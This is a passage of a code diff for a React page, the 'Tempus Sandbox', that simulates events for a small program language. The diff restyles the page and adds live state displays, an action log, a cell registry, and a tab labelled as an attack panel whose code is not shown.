+            <span style={{ color:'rgba(255,255,255,0.2)' }}>{e.ts}</span>
+            <span style={{ color:'rgba(239,68,68,0.55)' }}>{e.bytes}B</span>
+            <span style={{ color:'rgba(255,255,255,0.18)', fontStyle:'italic',
+                           overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
+              discarded · no parser
+            </span>
+          </div>
+        ))}
+      </div>
+    </div>
+  );
 }
 
 // ── Page ─────────────────────────────────────────────────────────────────────
 interface Stats { total: number; dispatched: number; anomalies: number; done: boolean; }
+interface LiveState {
+  phase: string; cycle: number; lastDP: number | null;
+  activeCell: string | null; lastAction: string | null;
+}
 
 function TempusSandbox() {
-  const [code,    setCode]    = useState(DEFAULT);
-  const [nEvents, setNEvents] = useState(600);
-  const [noise,   setNoise]   = useState(0.35);
-  const [speed,   setSpeed]   = useState(200);   // events / second
-  const [error,   setError]   = useState<string | null>(null);
-  const [running, setRunning] = useState(false);
-  const [stats,   setStats]   = useState<Stats>({ total: 0, dispatched: 0, anomalies: 0, done: false });
+  const [code,       setCode]       = useState(DEFAULT);
+  const [nEvents,    setNEvents]    = useState(600);
+  const [noise,      setNoise]      = useState(0.35);
+  const [speed,      setSpeed]      = useState(200);
+  const [error,      setError]      = useState<string | null>(null);
+  const [running,    setRunning]    = useState(false);
+  const [leftTab,    setLeftTab]    = useState<'program' | 'attack'>('program');
+  const [stats,      setStats]      = useState<Stats>({ total:0, dispatched:0, anomalies:0, done:false });
+  const [liveState,  setLiveState]  = useState<LiveState>({ phase:'IDLE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
+  const [actionLog,  setActionLog]  = useState<ActionEntry[]>([]);
+  const [parsedProg, setParsedProg] = useState<ParsedProgram | null>(null);
+  const [colors,     setColors]     = useState<Map<string, string>>(new Map());
+  const [cellCounts, setCellCounts] = useState<Map<string, number>>(new Map());
 
   const simRef      = useRef<ReturnType<typeof createSimulator> | null>(null);
   const colorsRef   = useRef<Map<string, string>>(new Map());
-  const channelsRef = useRef<string[]>([]);
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const dpRef       = useRef<HTMLCanvasElement>(null);
 
-  const dpRef   = useRef<HTMLCanvasElement>(null);
-  const cellRef = useRef<HTMLCanvasElement>(null);
-  const chanRef = useRef<HTMLCanvasElement>(null);
-  const actRef  = useRef<HTMLCanvasElement>(null);
-
-  const redrawAll = useCallback(() => {
+  const redrawCanvas = useCallback(() => {
     if (!simRef.current) return;
-    const events = simRef.current.getEvents();
-    const cells  = simRef.current.getCells();
-    drawDpScatter  (dpRef.current,   events, cells, colorsRef.current);
-    drawCellBar    (cellRef.current,  events, cells, colorsRef.current);
-    drawChannelBar (chanRef.current,  events, channelsRef.current);
-    drawActionBar  (actRef.current,   events, colorsRef.current);
-    setStats({
-      total:      events.length,
-      dispatched: events.filter(e => e.actionFired !== null).length,
-      anomalies:  events.filter(e => e.cell === 'anomaly').length,
-      done:       simRef.current.isDone(),
-    });
+    drawDpScatter(dpRef.current, simRef.current.getEvents(), simRef.current.getCells(), colorsRef.current);
   }, []);
 
   const handleRun = useCallback(() => {
     try {
       setError(null);
       const prog = buildRuntime(parse(lex(code)));
-      colorsRef.current   = cellPalette(Array.from(prog.cells.keys()));
-      channelsRef.current = prog.compose?.channels ?? Array.from(prog.syncs.keys());
+      const newColors = cellPalette(Array.from(prog.cells.keys()));
+      colorsRef.current = newColors;
+      setColors(newColors);
+      setParsedProg(prog);
+      setActionLog([]);
+      setCellCounts(new Map());
+      setLiveState({ phase:'COMPILE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
       const batchSize = Math.max(1, Math.floor(speed / 20));
-      simRef.current = createSimulator(prog, { totalEvents: nEvents, noiseSigma: noise, seed: 42, batchSize });
+      simRef.current  = createSimulator(prog, { totalEvents: nEvents, noiseSigma: noise, seed: 42, batchSize });
       setRunning(true);
     } catch (e: any) {
       setError(String(e.message));
@@ -383,14 +612,21 @@ function TempusSandbox() {
   const handleStop = useCallback(() => {
     if (intervalRef.current) clearInterval(intervalRef.current);
     setRunning(false);
+    setLiveState(s => ({ ...s, phase: 'IDLE' }));
   }, []);
 
   const handleReset = useCallback(() => {
     handleStop();
     simRef.current?.reset();
-    redrawAll();
-    setStats({ total: 0, dispatched: 0, anomalies: 0, done: false });
-  }, [handleStop, redrawAll]);
+    setActionLog([]);
+    setCellCounts(new Map());
+    setStats({ total:0, dispatched:0, anomalies:0, done:false });
+    setLiveState({ phase:'IDLE', cycle:0, lastDP:null, activeCell:null, lastAction:null });
+    if (dpRef.current) {
+      const ctx = dpRef.current.getContext('2d');
+      ctx?.clearRect(0, 0, dpRef.current.width, dpRef.current.height);
+    }
+  }, [handleStop]);
 
   // simulation loop
   useEffect(() => {
@@ -398,165 +634,253 @@ function TempusSandbox() {
     intervalRef.current = setInterval(() => {
       if (!simRef.current || simRef.current.isDone()) {
         setRunning(false);
+        setLiveState(s => ({ ...s, phase:'IDLE' }));
         return;
       }
-      simRef.current.generateBatch();
-      redrawAll();
+      const batch = simRef.current.generateBatch();
+      const last  = batch[batch.length - 1];
+      if (last) {
+        setLiveState({
+          phase:      last.phase,
+          cycle:      last.M,
+          lastDP:     last.dp,
+          activeCell: last.cell,
+          lastAction: last.actionFired,
+        });
+      }
+
+      const completions = batch.filter(e => e.actionFired !== null);
+      if (completions.length > 0) {
+        const newEntries: ActionEntry[] = completions.map(e => ({
+          ts:     nowStamp(),
+          cell:   e.cell,
+          action: e.actionFired!,
+          dp:     e.dp,
+          color:  colorsRef.current.get(e.cell) ?? ANOMALY,
+        }));
+        setActionLog(prev => [...newEntries, ...prev].slice(0, 80));
+      }
+
+      const events = simRef.current.getEvents();
+      const cnts   = new Map<string, number>();
+      events.forEach(ev => cnts.set(ev.cell, (cnts.get(ev.cell) ?? 0) + 1));
+      setCellCounts(new Map(cnts));
+
+      setStats({
+        total:      events.length,
+        dispatched: events.filter(e => e.actionFired !== null).length,
+        anomalies:  events.filter(e => e.cell === 'anomaly').length,
+        done:       simRef.current.isDone(),
+      });
+
+      redrawCanvas();
     }, 50);
     return () => { if (intervalRef.current) clearInterval(intervalRef.current); };
-  }, [running, redrawAll]);
+  }, [running, redrawCanvas]);
 
-  // resize observer — redraw when panel resizes
+  // resize observer
   useEffect(() => {
-    const canvases = [dpRef, cellRef, chanRef, actRef].map(r => r.current).filter(Boolean);
-    if (!canvases.length) return;
-    const ro = new ResizeObserver(() => redrawAll());
-    canvases.forEach(c => ro.observe(c!));
+    if (!dpRef.current) return;
+    const ro = new ResizeObserver(() => redrawCanvas());
+    ro.observe(dpRef.current);
     return () => ro.disconnect();
-  }, [redrawAll]);
+  }, [redrawCanvas]);
 
   const pct = nEvents > 0 ? Math.round((stats.total / nEvents) * 100) : 0;
 
-  // ── JSX ────────────────────────────────────────────────────────────────────
   return (
-    <div style={{ background:'#030705', color:'#e2e8f0', minHeight:'100vh',
-                  fontFamily:'Montserrat, monospace', display:'flex', flexDirection:'column' }}>
+    <div style={{ background:'#030705', color:'#e2e8f0', height:'100vh',
+                  fontFamily:'monospace', display:'flex', flexDirection:'column', overflow:'hidden' }}>
       <Head><title>Tempus Sandbox</title></Head>
 
       {/* ── header ── */}
-      <header style={{ height:56, borderBottom:'1px solid rgba(255,255,255,0.07)',
-                       display:'flex', alignItems:'center', padding:'0 24px', gap:20, flexShrink:0 }}>
-        <Link href="/" style={{ color:'rgba(255,255,255,0.4)', fontSize:12,
-                                textDecoration:'none', letterSpacing:2 }}>← BACK</Link>
-        <span style={{ color:'rgba(255,255,255,0.9)', fontSize:12, letterSpacing:4, fontWeight:600 }}>
-          TEMPUS  SANDBOX
+      <header style={{ height:50, borderBottom:'1px solid rgba(255,255,255,0.07)',
+                       display:'flex', alignItems:'center', padding:'0 20px', gap:16, flexShrink:0 }}>
+        <Link href="/" style={{ color:'rgba(255,255,255,0.3)', fontSize:10,
+                                textDecoration:'none', letterSpacing:'0.16em' }}>← BACK</Link>
+        <span style={{ color:'rgba(255,255,255,0.85)', fontSize:11, letterSpacing:'0.3em', fontWeight:700 }}>
+          TEMPUS
         </span>
-        <div style={{ marginLeft:'auto', display:'flex', gap:8 }}>
-          <button onClick={handleRun} disabled={running}
-            style={{ padding:'5px 18px', fontSize:11, letterSpacing:2, cursor: running ? 'not-allowed' : 'pointer',
-                     background: running ? '#1a2a1a' : '#58E6D9', color: running ? '#445' : '#020f0d',
-                     border:'none', fontFamily:'inherit', fontWeight:700 }}>
-            RUN
-          </button>
-          <button onClick={handleStop} disabled={!running}
-            style={{ padding:'5px 18px', fontSize:11, letterSpacing:2, cursor: !running ? 'not-allowed' : 'pointer',
-                     background:'transparent', color: !running ? 'rgba(255,255,255,0.2)' : '#ef4444',
-                     border:`1px solid ${!running ? 'rgba(255,255,255,0.1)' : '#ef4444'}`, fontFamily:'inherit' }}>
-            STOP
-          </button>
-          <button onClick={handleReset}
-            style={{ padding:'5px 18px', fontSize:11, letterSpacing:2, cursor:'pointer',
-                     background:'transparent', color:'rgba(255,255,255,0.35)',
-                     border:'1px solid rgba(255,255,255,0.12)', fontFamily:'inherit' }}>
-            RESET
-          </button>
+        <div style={{ marginLeft:'auto', display:'flex', gap:7 }}>
+          {[
+            { label:'RUN ▶', onClick: handleRun,  disabled: running,
+              style: { background: running ? '#1a2a1a' : '#58E6D9', color: running ? '#445' : '#020f0d',
+                       border:'none', fontWeight:700 } },
+            { label:'STOP',  onClick: handleStop, disabled: !running,
+              style: { background:'transparent', color: !running ? 'rgba(255,255,255,0.15)' : '#ef4444',
+                       border:`1px solid ${!running ? 'rgba(255,255,255,0.07)' : '#ef4444'}` } },
+            { label:'RESET', onClick: handleReset, disabled: false,
+              style: { background:'transparent', color:'rgba(255,255,255,0.28)',
+                       border:'1px solid rgba(255,255,255,0.1)' } },
+          ].map(b => (
+            <button key={b.label} onClick={b.onClick} disabled={b.disabled}
+              style={{ padding:'5px 15px', fontSize:10, letterSpacing:'0.12em',
+                       cursor: b.disabled ? 'not-allowed' : 'pointer',
+                       fontFamily:'monospace', ...b.style }}>
+              {b.label}
+            </button>
+          ))}
         </div>
       </header>
 
-      {/* ── body: editor | charts ── */}
+      {/* ── body ── */}
       <div style={{ display:'flex', flex:1, overflow:'hidden', minHeight:0 }}>
 
-        {/* ── LEFT: editor + controls ── */}
-        <div style={{ width:420, flexShrink:0, borderRight:'1px solid rgba(255,255,255,0.07)',
+        {/* ── LEFT ── */}
+        <div style={{ width:395, flexShrink:0, borderRight:'1px solid rgba(255,255,255,0.07)',
                       display:'flex', flexDirection:'column', overflow:'hidden' }}>
 
-          {/* code editor */}
-          <textarea
-            value={code}
-            onChange={e => setCode(e.target.value)}
-            spellCheck={false}
-            style={{ flex:1, background:'#070c0a', color:'#c8faf5', fontFamily:'monospace',
-                     fontSize:12, lineHeight:1.6, padding:'16px', border:'none', resize:'none',
-                     outline:'none', minHeight:0 }}
-          />
+          {/* tabs */}
+          <div style={{ display:'flex', borderBottom:'1px solid rgba(255,255,255,0.07)', flexShrink:0 }}>
+            {(['program', 'attack'] as const).map(tab => (
+              <button key={tab} onClick={() => setLeftTab(tab)}
+                style={{ flex:1, padding:'9px 8px', fontFamily:'monospace', fontSize:9,
+                         letterSpacing:'0.16em', textTransform:'uppercase',
+                         background:'transparent', border:'none', cursor:'pointer',
+                         borderBottom: leftTab === tab ? '2px solid #58E6D9' : '2px solid transparent',
+                         color: leftTab === tab ? '#58E6D9' : 'rgba(255,255,255,0.28)',
+                         transition:'all 0.12s' }}>
+                {tab === 'attack' ? 'Structural Incorruptibility' : 'Program'}
+              </button>
+            ))}
+          </div>
 
-          {/* error */}
-          {error && (
-            <div style={{ background:'#2a0a0a', color:'#ef4444', fontSize:11,
-                          padding:'8px 14px', borderTop:'1px solid #4a1515' }}>
-              {error}
+          {/* PROGRAM tab */}
+          {leftTab === 'program' && (<>
+            <textarea
+              value={code} onChange={e => setCode(e.target.value)} spellCheck={false}
+              style={{ flex:1, background:'#060b08', color:'#c8faf5', fontFamily:'monospace',
+                       fontSize:11.5, lineHeight:1.65, padding:'14px', border:'none',
+                       resize:'none', outline:'none', minHeight:0 }}
+            />
+            {error && (
+              <div style={{ background:'#170606', color:'#ef4444', fontSize:10,
+                            padding:'8px 12px', borderTop:'1px solid #3a1010',
+                            lineHeight:1.5 }}>
+                {error}
+              </div>
+            )}
+            <div style={{ padding:'11px 13px', borderTop:'1px solid rgba(255,255,255,0.06)',
+                          display:'flex', flexDirection:'column', gap:9, flexShrink:0 }}>
+              <div style={{ display:'grid', gridTemplateColumns:'68px auto 1fr', gap:8, alignItems:'center' }}>
+                <label style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.3)', textTransform:'uppercase' }}>Events</label>
+                <input type="number" value={nEvents} min={50} max={5000} step={50}
+                  onChange={e => setNEvents(+e.target.value)}
+                  style={{ width:76, background:'#0d1a14', border:'1px solid rgba(255,255,255,0.08)',
+                           color:'#c8faf5', fontFamily:'monospace', fontSize:11, padding:'3px 6px' }}
+                />
+              </div>
+              {[
+                { label:'Noise σ', min:0, max:1, step:0.05, val:noise, set:setNoise, fmt:(v:number) => v.toFixed(2), unit:'' },
+                { label:'Speed',   min:20, max:1000, step:20, val:speed, set:setSpeed, fmt:(v:number) => String(v), unit:'/s' },
+              ].map(({ label, min, max, step, val, set, fmt, unit }) => (
+                <div key={label} style={{ display:'grid', gridTemplateColumns:'68px 1fr 44px', gap:8, alignItems:'center' }}>
+                  <label style={{ fontSize:8, letterSpacing:'0.14em', color:'rgba(255,255,255,0.3)', textTransform:'uppercase' }}>{label}</label>
+                  <input type="range" min={min} max={max} step={step} value={val}
+                    onChange={e => set(+e.target.value)} style={{ accentColor:'#58E6D9' }} />
+                  <span style={{ fontSize:10, color:'#58E6D9', textAlign:'right' }}>{fmt(val)}{unit}</span>
+                </div>
+              ))}
+              {/* progress */}
+              <div>
+                <div style={{ background:'rgba(255,255,255,0.05)', height:2, borderRadius:1 }}>
+                  <div style={{ background:'#58E6D9', height:'100%', borderRadius:1,
+                                width:`${pct}%`, transition:'width 0.1s' }} />
+                </div>
+                <div style={{ display:'grid', gridTemplateColumns:'repeat(4,1fr)', marginTop:7 }}>
+                  {[
+                    ['EVENTS',   `${stats.total}/${nEvents}`],
+                    ['DISPATCH', String(stats.dispatched)],
+                    ['ANOMALY',  String(stats.anomalies)],
+                    ['STATUS',   stats.done ? 'DONE' : running ? 'RUN' : 'IDLE'],
+                  ].map(([k, v]) => (
+                    <div key={k} style={{ textAlign:'center' }}>
+                      <div style={{ fontSize:7, letterSpacing:'0.12em', color:'rgba(255,255,255,0.2)', textTransform:'uppercase' }}>{k}</div>
+                      <div style={{ fontSize:11, color:
+                        k==='STATUS' && running ? '#58E6D9' :
+                        k==='ANOMALY' && stats.anomalies > 0 ? '#ef4444' :
+                        'rgba(255,255,255,0.55)' }}>{v}</div>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            </div>
+          </>)}
+
+          {/* ATTACK tab */}
+          {leftTab === 'attack' && (
+            <div style={{ flex:1, overflow:'hidden', display:'flex', flexDirection:'column' }}>
+              <AttackPanel cells={parsedProg?.cells ?? new Map()} />
             </div>
           )}
+        </div>
 
-          {/* sim controls */}
-          <div style={{ padding:'14px 16px', borderTop:'1px solid rgba(255,255,255,0.07)',
-                        display:'flex', flexDirection:'column', gap:10 }}>
+        {/* ── RIGHT ── */}
+        <div style={{ flex:1, display:'flex', flexDirection:'column', overflow:'hidden', minWidth:0 }}>
 
-            <div style={{ display:'flex', gap:12, alignItems:'center' }}>
-              <label style={{ fontSize:10, letterSpacing:2, color:'rgba(255,255,255,0.4)', width:80 }}>
-                EVENTS
-              </label>
-              <input type="number" value={nEvents} min={50} max={5000} step={50}
-                onChange={e => setNEvents(+e.target.value)}
-                style={{ width:80, background:'#0d1a14', border:'1px solid rgba(255,255,255,0.1)',
-                         color:'#c8faf5', fontFamily:'monospace', fontSize:12, padding:'3px 6px' }}
-              />
+          <StateStrip
+            phase={liveState.phase}
+            cycle={liveState.cycle}
+            lastDP={liveState.lastDP}
+            activeCell={liveState.activeCell}
+            lastAction={liveState.lastAction}
+            colors={colors}
+          />
+
+          {/* 3-col grid: [timeline(span2) | registry] / [partition(span2) | log] */}
+          <div style={{
+            flex:1, display:'grid',
+            gridTemplateColumns:'1fr 1fr 260px',
+            gridTemplateRows:'1fr 1fr',
+            gap:1, background:'rgba(255,255,255,0.04)',
+            minHeight:0, overflow:'hidden',
+          }}>
+            {/* ΔP timeline — spans cols 1-2, row 1 */}
+            <div style={{ gridColumn:'1 / 3', gridRow:'1', background:'#030705', overflow:'hidden' }}>
+              <canvas ref={dpRef} style={{ width:'100%', height:'100%', display:'block' }} />
             </div>
 
-            <div style={{ display:'flex', gap:12, alignItems:'center' }}>
-              <label style={{ fontSize:10, letterSpacing:2, color:'rgba(255,255,255,0.4)', width:80 }}>
-                NOISE  σ
-              </label>
-              <input type="range" min={0} max={1} step={0.05} value={noise}
-                onChange={e => setNoise(+e.target.value)}
-                style={{ flex:1, accentColor:'#58E6D9' }}
-              />
-              <span style={{ fontSize:11, color:'#58E6D9', width:32 }}>{noise.toFixed(2)}</span>
+            {/* cell registry — col 3, row 1 */}
+            <div style={{ gridColumn:'3', gridRow:'1', background:'#030705', overflow:'hidden' }}>
+              {parsedProg ? (
+                <CellRegistry
+                  cells={parsedProg.cells}
+                  colors={colors}
+                  whens={parsedProg.whens}
+                  counts={cellCounts}
+                  activeCell={liveState.activeCell}
+                />
+              ) : (
+                <div style={{ height:'100%', display:'flex', alignItems:'center', justifyContent:'center',
+                              fontSize:10, color:'rgba(255,255,255,0.1)', fontStyle:'italic' }}>
+                  compile to see registry
+                </div>
+              )}
             </div>
 
-            <div style={{ display:'flex', gap:12, alignItems:'center' }}>
-              <label style={{ fontSize:10, letterSpacing:2, color:'rgba(255,255,255,0.4)', width:80 }}>
-                SPEED
-              </label>
-              <input type="range" min={20} max={1000} step={20} value={speed}
-                onChange={e => setSpeed(+e.target.value)}
-                style={{ flex:1, accentColor:'#58E6D9' }}
-              />
-              <span style={{ fontSize:11, color:'#58E6D9', width:54 }}>{speed}/s</span>
+            {/* ΔP partition — spans cols 1-2, row 2 */}
+            <div style={{ gridColumn:'1 / 3', gridRow:'2', background:'#030705', overflow:'hidden' }}>
+              {parsedProg ? (
+                <DpPartition
+                  cells={parsedProg.cells}
+                  colors={colors}
+                  counts={cellCounts}
+                  lastDP={liveState.lastDP}
+                />
+              ) : (
+                <div style={{ height:'100%', display:'flex', alignItems:'center', justifyContent:'center',
+                              fontSize:10, color:'rgba(255,255,255,0.1)', fontStyle:'italic' }}>
+                  ΔP partition
+                </div>
+              )}
             </div>
 
-            {/* progress + stats */}
-            <div style={{ marginTop:4 }}>
-              <div style={{ background:'rgba(255,255,255,0.06)', height:3, borderRadius:2 }}>
-                <div style={{ background:'#58E6D9', height:'100%', borderRadius:2,
-                              width:`${pct}%`, transition:'width 0.15s' }} />
-              </div>
-              <div style={{ display:'flex', justifyContent:'space-between', marginTop:8 }}>
-                {[
-                  ['EVENTS',    `${stats.total} / ${nEvents}`],
-                  ['DISPATCH',  String(stats.dispatched)],
-                  ['ANOMALY',   String(stats.anomalies)],
-                  ['STATUS',    stats.done ? 'DONE' : running ? 'RUN' : 'IDLE'],
-                ].map(([k, v]) => (
-                  <div key={k} style={{ textAlign:'center' }}>
-                    <div style={{ fontSize:8, letterSpacing:2, color:'rgba(255,255,255,0.3)' }}>{k}</div>
-                    <div style={{ fontSize:11, color: k === 'STATUS' && running ? '#58E6D9'
-                                                    : k === 'ANOMALY' && stats.anomalies > 0 ? '#ef4444'
-                                                    : 'rgba(255,255,255,0.7)' }}>{v}</div>
-                  </div>
-                ))}
-              </div>
+            {/* action log — col 3, row 2 */}
+            <div style={{ gridColumn:'3', gridRow:'2', background:'#030705', overflow:'hidden' }}>
+              <ActionLog entries={actionLog} />
             </div>
           </div>
         </div>
-
-        {/* ── RIGHT: 2×2 chart grid ── */}
-        <div style={{ flex:1, display:'grid', gridTemplateColumns:'1fr 1fr',
-                      gridTemplateRows:'1fr 1fr', gap:1, background:'rgba(255,255,255,0.05)',
-                      minWidth:0 }}>
-          {[
-            { ref: dpRef,   label: 'ΔP TIMELINE'     },
-            { ref: cellRef, label: 'CELL FREQUENCY'  },
-            { ref: chanRef, label: 'CHANNEL ACTIVITY'},
-            { ref: actRef,  label: 'ACTION DISPATCH' },
-          ].map(({ ref, label }) => (
-            <div key={label} style={{ background:'#030705', position:'relative', overflow:'hidden' }}>
-              <canvas ref={ref as React.RefObject<HTMLCanvasElement>}
-                      style={{ width:'100%', height:'100%', display:'block' }} />
-            </div>
-          ))}
-        </div>
-
       </div>
     </div>
   );
